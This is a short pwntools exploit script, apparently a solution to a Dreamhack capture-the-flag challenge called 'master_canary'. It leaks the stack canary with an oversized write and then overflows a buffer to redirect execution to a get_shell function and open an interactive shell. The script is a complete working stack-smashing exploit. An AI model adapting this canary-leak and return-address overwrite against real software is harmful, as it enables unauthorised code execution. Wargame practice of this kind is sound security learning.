#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./master_canary', checksec=False)

libc = elf.libc

gs = """
b *main
b *main+102
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 14251)
    else:
        return process(elf.path)

io = start()
sla(b'> ',b'1')
sla(b'> ',b'2')

payload = b'a'*(2280)

sla(b'Size: ',str(2280+1))
sla(b'Data: ',payload)
io.recvuntil(b'\n')
canary = unpack(b'\x00' + io.recvn(7))
info('canary: ' + hex(canary))

sla(b'> ',b'3')

payload = b'a'*40
payload += pack(canary)
payload += b'a'*8
payload += pack(elf.sym['get_shell']+1)

sa(b'comment: ',payload)
io.interactive()